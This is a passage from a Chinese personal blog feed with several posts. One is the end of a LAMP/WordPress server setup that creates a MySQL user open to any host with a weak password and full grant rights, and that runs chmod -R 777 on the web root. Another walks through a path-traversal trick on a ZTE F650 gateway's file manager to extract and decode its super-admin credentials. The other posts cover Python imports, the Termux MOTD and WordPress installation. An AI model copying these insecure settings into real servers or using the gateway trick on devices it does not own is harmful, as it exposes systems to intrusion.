+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">USER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;pmauser&amp;#39;&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="s1">&amp;#39;%&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IDENTIFIED&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;mypassword&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GRANT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ALL&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">PRIVILEGES&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">TO&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;pmauser&amp;#39;&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="s1">&amp;#39;%&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WITH&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">GRANT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OPTION&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>然后用这个用户登录，果然成功登录！&lt;/p>
+&lt;h3 id="上传的文件大小超过phpini文件中定义的upload_max_filesize值">上传的文件大小超过php.ini文件中定义的upload_max_filesize值。
+&lt;/h3>&lt;p>在我为我的WP站点上传主题zip时，我遇到了这个问题。报错也非常明了，于是我在之前安装PHP时生成的phpinfo.php页面找到了我的php.ini文件路径：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Loaded Configuration File /etc/php/7.4/apache2/php.ini
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>直接vim编辑，在里面找到了：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-ini" data-lang="ini">&lt;span class="line">&lt;span class="cl">&lt;span class="na">upload_max_filesize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">2M&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>修改为7M，这个问题解决！然后新的问题又出现了。&lt;/p>
+&lt;h3 id="无法创建目录-wp-contentuploads202207它的父目录是否可以被服务器写入">无法创建目录 wp-content/uploads/2022/07。它的父目录是否可以被服务器写入
+&lt;/h3>&lt;p>修了一个bug,又出来一个，此时我心情复杂。继续上网查，发现可能是文件读取权限不够，于是直接使用&lt;strong>chmod&lt;/strong>命令把www文件夹以及里面的文件权限都改为777：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">chmod -R &lt;span class="m">777&lt;/span> /www
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>后再次尝试，终于成功！&lt;/p>
+&lt;h3 id="最后的话">最后的话
+&lt;/h3>&lt;p>这次很荣幸能试用这台ECS服务器，也了解到了许多之前没有了解过的领域：比如Apache、MySQL等等，并且又学到了许多新的Linux和SQL命令。也感谢阿里云能够推出这项活动来使全国各地的高校学生能够亲自上手体验一台云服务器。&lt;/p>
+&lt;h2 id="六成品展示">六，成品展示
+&lt;/h2>&lt;p>&lt;a class="link" href="https://imgtu.com/i/jOxc3d" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/07/23/jOxc3d.png"
+loading="lazy"
+alt="jOxc3d.png"
+>&lt;/a>&lt;/p></description></item><item><title>记:天翼网关ZXHN F650V2.0.0P1T3超管破解</title><link>https://blog.wuko.top/posts/2022/03/21/tianyigwpj.html/</link><pubDate>Mon, 21 Mar 2022 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2022/03/21/tianyigwpj.html/</guid><description>&lt;h1 id="前情提要">前情提要
+&lt;/h1>&lt;p>本地的电信免费给换了光猫(新光猫不带wifi功能&amp;hellip;)旧光猫就没用了，所以能拿来瞎搞了。这次尝试破解其超级管理员密码。&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/OAdbDg" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/05/03/OAdbDg.jpg"
+loading="lazy"
+alt="OAdbDg.jpg"
+>&lt;/a>&lt;/p>
+&lt;p>借鉴:&lt;a class="link" href="https://b23.tv/VTdqeQW" target="_blank" rel="noopener"
+>不拆机破解电信光猫的超级密码（适用于中兴ZXHN F650）&lt;/a>&lt;/p>
+&lt;h1 id="设备信息不一样可能会失效">设备信息(不一样可能会失效)
+&lt;/h1>&lt;p>`设备类型&lt;/p>
+&lt;p>GPON天翼网关(4口单频)&lt;/p>
+&lt;p>产品型号&lt;/p>
+&lt;p>ZXHN F650&lt;/p>
+&lt;p>软件版本号&lt;/p>
+&lt;p>V2.0.0P1T3`&lt;/p>
+&lt;h1 id="正文">正文
+&lt;/h1>&lt;p>因为先前这个网关的wifi是关闭着的，所以先用网线接到了电脑上，进入192.168.1.1输入默认用户密码打开了无线功能，方便后面用手机调试(因为本人电脑过于拉胯，故许多操作都用手机，实际上仅用电脑便可实现全部操作)。&lt;/p>
+&lt;p>插入U盘，打开网关储存管理中U盘文件管理。&lt;/p>
+&lt;p>下载抓包软件Fiddler，点击Rules&amp;ndash;Automatic Breakpoints&amp;ndash;Before Requests(汉化版为规则&amp;gt;自动断点&amp;gt;请求前)&lt;/p>
+&lt;p>返回浏览器文件管理界面，点击任意文件。&lt;/p>
+&lt;p>返回Fiddler，查看拦截下的请求，修改&lt;code>body&lt;/code>中的&lt;code>path&lt;/code>中的&lt;code>value&lt;/code>为&lt;code>/&lt;/code>。&lt;/p>
+&lt;p>终止拦截:点击Rules&amp;ndash;Automatic Breakpoints&amp;ndash;Disabled(汉化版为规则&amp;gt;自动断点&amp;gt;关闭)&lt;/p>
+&lt;p>返回浏览器网关界面，发现进入网关根目录。&lt;/p>
+&lt;p>进入&lt;code>/userconfig/cfg&lt;/code>，找到&lt;code>db_user_cfg.xml&lt;/code>后复制其至U盘，弹出U盘后插入至电脑。&lt;/p>
+&lt;p>下载软件&lt;code>RouterPassView&lt;/code>(警惕p2p下崽器，误点请直接结束进程，血的教训)&lt;/p>
+&lt;p>打开RouterPassView，导入刚才的文件&lt;code>db_user_cfg.xml&lt;/code>(CTRL+O)，&lt;code>CTRL+F&lt;/code>搜索&lt;code>telecomadmin&lt;/code>，然后就看到了你的超级管理账号和密码啦！&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/OAdqbQ" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/05/03/OAdqbQ.jpg"
+loading="lazy"
+alt="OAdqbQ.jpg"
+>&lt;/a>&lt;/p>
+&lt;p>之后输入超管账号密码即可进入高级设置，记得关掉网关的远程通信以防止超级管理密码被远程修改。&lt;/p></description></item><item><title>Archives</title><link>https://blog.wuko.top/pages/archives/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/pages/archives/</guid><description/></item><item><title>记:Python导入不同路径文件</title><link>https://blog.wuko.top/posts/2022/01/14/py_diffimport.html/</link><pubDate>Fri, 14 Jan 2022 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2022/01/14/py_diffimport.html/</guid><description>&lt;p>最近写QQbot脚本的时候，遇到了一个问题：&lt;/p>
+&lt;p>需要在a.py文件中导入同目录下另一个文件夹plugins中的b.py文件。&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/7371ns" target="_blank" rel="noopener"
+>&lt;img src="https://s4.ax1x.com/2022/01/14/7371ns.jpg"
+loading="lazy"
+alt="7371ns.jpg"
+>&lt;/a>&lt;/p>
+&lt;p>网上的方法稍加变动，最后实现了：&lt;/p>
+&lt;p>a.py:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;/plugins/&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">b&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>b.py:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">text&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;hi&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">text&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>输出: &lt;code>hi&lt;/code>&lt;/p>
+&lt;p>原理大概理解了:&lt;/p>
+&lt;p>先在终端里查看&lt;code>sys.path&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;/storage/emulated/0/1USER/termux/python&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;/data/data/com.termux/files/usr/lib/python310.zip&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;/data/data/com.termux/files/usr/lib/python3.10&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;/data/data/com.termux/files/usr/lib/python3.10/lib-dynload&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;/data/data/com.termux/files/usr/lib/python3.10/site-packages&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>会发现默认的模块路径是一个列表，并且第一个就是我们所在的路径。&lt;/p>
+&lt;p>那么接下来想要导入不同路径的py文件，可以把它看做一个模块，再导入。&lt;/p>
+&lt;p>先在b.py所在路径创建一个&lt;code>__init__.py&lt;/code>文件，模块默认必须得有此文件，可以为空也可以初始化一些数据。&lt;/p>
+&lt;p>然后在a.py中使用&lt;code>append()&lt;/code>在&lt;code>sys.path&lt;/code>列表中添加b.py所在的路径&lt;code>/storage/emulated/0/1USER/termux/python/plugins/&lt;/code>，因为为了确保在不同设备运行，所以先获取运行的绝对路径&lt;code>sys.path[0]&lt;/code>，然后再在后面加上&lt;code>/plugins/&lt;/code>，所以就是:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;/plugins/&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>最后导入b.py就可以了！&lt;/p></description></item><item><title>Termux启动语改为Screenfect</title><link>https://blog.wuko.top/posts/2021/12/04/tremux%E5%90%AF%E5%8A%A8%E8%AF%AD%E4%BF%AE%E6%94%B9%E4%B8%BAscreenfetch.html/</link><pubDate>Sat, 04 Dec 2021 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2021/12/04/tremux%E5%90%AF%E5%8A%A8%E8%AF%AD%E4%BF%AE%E6%94%B9%E4%B8%BAscreenfetch.html/</guid><description>&lt;blockquote>
+&lt;p>最近更新了下termux，结果配置被清了，启动语变成了原版，所以借此机会记录下修改termux启动语为screenfetch，以免下次忘记。&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="安装-_screenfetch_-包">安装 &lt;em>screenfetch&lt;/em> 包:
+&lt;/h3>&lt;p>&lt;code>pkg install screenfetch&lt;/code>&lt;/p>
+&lt;h3 id="输出至启动语文件">输出至启动语文件
+&lt;/h3>&lt;p>&lt;code>screenfetch &amp;gt; $PREFIX/etc/motd&lt;/code>&lt;/p>
+&lt;h3 id="新建活动窗口">新建活动窗口
+&lt;/h3>&lt;p>&lt;img src="https://blog.wuko.top/posts/2021/2021-12-04-img1.png"
+loading="lazy"
+alt="2021-12-04-img1.png"
+>&lt;/p>
+&lt;p>大功告成！&lt;/p>
+&lt;!-- 属性什么的不要错了，最好用双引号括住 -->
+&lt;!-- 网易云的iframe需要做些调整，调整如下 -->
+&lt;iframe src="//music.163.com/outchain/player?type=2&amp;id=22785170&amp;auto=0&amp;height=66" frameborder="0" width="100%" height="86px">
+&lt;/iframe></description></item><item><title>从无到有丨零基础个人博客搭建</title><link>https://blog.wuko.top/posts/2021/05/15/buildblog.html/</link><pubDate>Sat, 15 May 2021 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2021/05/15/buildblog.html/</guid><description>&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>该页面为原wp发布内容，转md格式后可能会有部分格式异常&lt;/strong>&lt;/p>
+&lt;p>&lt;span class="has-inline-color has-cyan-bluish-gray-color">这是个广告:如果您需要人工搭建却不会或懒得动手，可以联系我人工搭建(有偿)，请联系邮箱admin@wuko.top或微信wuko233(请备注来意)，感谢支持。&lt;/span>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>相信很多人都像我一样想要一个在互联网上一个属于自己的小天地，可以实现这个愿望的，除了依托于各大网站的空间功能，我们还可以搭建一个完全属于你的个人博客，不但相对第三方平台更加独立，而且更加便于交流，你的文章也不会因平台说没就没。&lt;s>(除非删库跑路)&lt;/s>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>本篇文章会以纯小白的视角来从零开始介绍，还可以搭配网络上的教程视频配合食用。[heimu]虽然安装wordpress为全傻瓜操作，但我还是决定写这篇教程，绝对不是因为建站快一年一篇正式文章也没有写而来凑数的！([/heimu]&lt;/p>
+&lt;iframe src="//music.163.com/outchain/player?type=2&amp;id=833263&amp;auto=0&amp;height=66" frameborder="0" width="100%" height="86px">
+&lt;/iframe>
+&lt;!-- wp:heading {"level":3} -->
+&lt;h3 id="一准备工作">&lt;strong>一，准备工作&lt;/strong>
+&lt;/h3>&lt;!-- /wp:heading -->
+&lt;p>[danger]能够上网的设备一台(如手机，电脑、智能冰箱等)&lt;/p>
+&lt;p>善于理解的大脑与勤善于实践的手&lt;/p>
+&lt;p>最好自备科学[/danger]&lt;/p>
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>1，服务器的准备&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>想要安放你那无处安放的魅力，就需要有一台服务器(或虚拟主机)来储存你的网站。你可以选择在各大服务器商购买服务器/虚拟主机(如阿里云，西部数码等)，也可以选择其它云的免费主机服务。&lt;strong>&lt;span class="has-inline-color has-vivid-red-color">但值得注意的是，这些主机大都可能会随时跑路，如果你不是像我一样是家境贫寒学生党，还请尽量购买大厂服务器。&lt;/span>&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>购买服务器时，要注意服务器的配置与流量，一般来说，1核2G内存足够带动你的个人博客。除了注意配置，还需注意服务器的系统与你想要装的博客系统之间的兼容性，如我们下面要安装的Wordpress就需要Linux系统。&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>除系统外，你还需要注意服务器的位置，若服务器位于国内(香港澳门台湾除外)，你还需要对自己的域名进行&lt;strong>备案&lt;/strong>，未备案的域名&lt;strong>无法使用国内服务器&lt;/strong>。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>[heimu]除购买服务器外，你还可以将自己的移动设备或电脑用作服务器，再加上内网穿透即可实现服务器功能，但该方法不但需要支付内网穿透费用，对你的设备也会有不小的损耗，且方法繁琐，只适合喜欢鼓捣的老哥鼓捣。[/heimu]&lt;/p>
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>2，域名的准备&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>除服务器外，第二重要的便是域名了。在域名方面你可以选择&lt;strong>顶级域名&lt;/strong>(xxx.xxx)与&lt;strong>二级域名&lt;/strong>(xxx.xxxx.xxx)。网络上有许多免费的二级域名解析，但极易被浏览器或通讯软件标记为危险网站。顶级域名除tk、ml等非洲国家顶级域名外，均需购买，且价格不等(尤其是溢价域名(;´Д`))，可根据需求查看各大域名商价位表(如阿里万网、西部数码等)。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:html -->
+&lt;p>值得一提，你的域名会极大程度的影响你的&lt;strong>SEO&lt;/strong>(搜索引擎优化，利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名)，二级域名基本可以不用想了，而免费的顶级域名也基本不会有SEO，所以还是建议购买顶级域名。&lt;/p>
+&lt;!-- /wp:html -->
+&lt;!-- wp:paragraph -->
+&lt;p>在域名的选择上，一定要简洁、明了、好记、干净。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:heading {"level":3} -->
+&lt;h3 id="二正式开始">&lt;strong>二，正式开始&lt;/strong>
+&lt;/h3>&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;strong>1，域名DNS解析与绑定服务器&lt;/strong>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>在你购买域名后，大都会指引你去DNS解析，你可以选择由域名商提供的DNS解析，也可以自行寻找其它服务商。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>在你的主机控制面板中，找到&amp;quot;绑定域名&amp;quot;，内容大致如下图:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:image {"id":27,"sizeSlug":"large"} -->
+&lt;p>&lt;img src="https://blog.wuko.top/%e8%b6%85%e7%ba%a7%e6%88%aa%e5%b1%8f_20201018_141807_compress68-701x1024.jpg"
+loading="lazy"
+alt="27"
+>&lt;/p>
+&lt;!-- /wp:image -->
+&lt;!-- wp:paragraph -->
+&lt;p>你只需要复制要解析的记录值，即域名/地址（红字）并记住解析类型（常见有A、CNAME等）。打开DNS解析，大致内容如下图:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;img src="https://blog.wuko.top/%e8%b6%85%e7%ba%a7%e6%88%aa%e5%b1%8f_20201018_141736_compress21-1024x913.jpg"
+loading="lazy"
+alt="28"
+>&lt;/p>
+&lt;!-- /wp:image -->
+&lt;!-- wp:paragraph -->
+&lt;p>根据刚才主机面板的信息来选择记录类型，记录值填写你复制的内容，主机记录则填写你需要的二级域名，以域名wuko.top举例:主机记录:@，则解析后的域名为wuko.top；主机记录:www，则解析后的域名为www.wuko.top。根据你个人的需要来选择。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>解析后，再返回主机控制面板，将你刚刚解析的域名绑定至主机。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;img src="https://blog.wuko.top/%e8%b6%85%e7%ba%a7%e6%88%aa%e5%b1%8f_20201018_141807_compress68-701x1024.jpg"
+loading="lazy"
+alt="29"
+>&lt;/p>
+&lt;!-- /wp:image -->
+&lt;!-- wp:heading {"level":4} -->
+&lt;h4 id="2下载与安装wordpress">&lt;strong>2，下载与安装Wordpress&lt;/strong>
+&lt;/h4>&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
+&lt;p>在上面的步骤中，你已经初步搭建好了你的网站，现在只需要为你的网站装一个对外展示的系统，&lt;a class="link" href="https://wordpress.org/" target="_blank" rel="noopener"
+>wordpress&lt;/a>。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>打开&lt;a class="link" href="https://cn.wordpress.org/download/" target="_blank" rel="noopener"
+>https://cn.wordpress.org/download/&lt;/a>，点击下载最新版本wordpress的压缩包。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;img src="https://blog.wuko.top/%e8%b6%85%e7%ba%a7%e6%88%aa%e5%b1%8f_20201031_231215_compress22-1024x989.jpg"
+loading="lazy"
+alt="30"
+>&lt;/p>
+&lt;!-- /wp:image -->
+&lt;!-- wp:paragraph -->
+&lt;p>&lt;s>因wordpress服务器在国外，故下载速度感人，你可以用魔法或自行在网路上寻找压缩包下载，老版本也不要紧，安装后在服务器中再更新。&lt;/s>突然发现wp有中文官网，而且专门对国内进行了优化，速度还可以，所以把上面的链接改成了中文官网。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>打开你的服务器控制面板，找到在线文件管理器，进入根目录，将你下载好的安装包上传并解压。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph {"align":"center"} -->
+&lt;p>&lt;img src="https://blog.wuko.top/%e8%b6%85%e7%ba%a7%e6%88%aa%e5%b1%8f_20201031_233236_compress14-723x1024.jpg"
+loading="lazy"
+alt="31"
+>&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>访问**&amp;ldquo;你的域名/wp-admin/install.php&amp;rdquo;**，一般情况下会出现下面的页面:&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;img src="https://blog.wuko.top/Screenshot_20210515182326_compress21-671x1024.jpg"
+loading="lazy"
+alt="32"
+>&lt;/p>
+&lt;!-- wp:paragraph -->
+&lt;p>非一般情况下你可能会遇到诸如数据库不可用等问题，点击修复不管用可以尝试重启服务器、重启数据库，如果还有问题请百度或下面留言。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;img src="https://blog.wuko.top/Screenshot_20210515182400_compress33-576x1024.jpg"
+loading="lazy"
+alt="33"
+>]&lt;/p>
+&lt;!-- wp:paragraph -->
+&lt;p>点击下一步，根据提示语填入相应内容。确认无误后点击提交。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;img src="https://blog.wuko.top/Screenshot_20210515182413_compress60-1024x839.jpg"
+loading="lazy"
+alt="34"
+>&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/Screenshot_20210515182430_compress19-576x1024.jpg"
+loading="lazy"
+alt="35"
+>&lt;/p>
+&lt;!-- wp:paragraph -->
+&lt;p>点击&lt;strong>现在安装&lt;/strong>，填写相关信息，注意:除用户名外大部分都可再次修改(大概)，用户名建议别叫admin，密码不要用数据库密码。填写完成后继续。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;img src="https://blog.wuko.top/Screenshot_20210515182443_compress3-680x1024.jpg"
+loading="lazy"
+alt="36"
+>&lt;/p>
+&lt;!-- wp:paragraph -->
+&lt;p>成功安装！开始你的Wordpress之旅吧！&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>点击&lt;strong>登录&lt;/strong>访问博客后台，输入用户名密码即可进入控制面板。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;!-- wp:paragraph -->
+&lt;p>访问&lt;strong>你的网站的域名&lt;/strong>，即可进入博客前台。&lt;/p>
+&lt;!-- /wp:paragraph -->
+&lt;p>&lt;img src="https://blog.wuko.top/Screenshot_20210515182510_compress25-576x1024.jpg"
+loading="lazy"
+alt="37"
+>&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/Screenshot_20210515193806-1024x546.jpg"
+loading="lazy"
+alt="38"
+>&lt;figcaption>&lt;strong>Hello World!&lt;/strong>&lt;/figcaption>&lt;/p>
+&lt;!-- /wp:image -->
+&lt;!-- wp:heading {"level":3} -->
+&lt;h3 id="三写在最后">&lt;strong>三，写在最后&lt;/strong>
+&lt;/h3>&lt;!-- /wp:heading -->
+&lt;!-- wp:paragraph -->
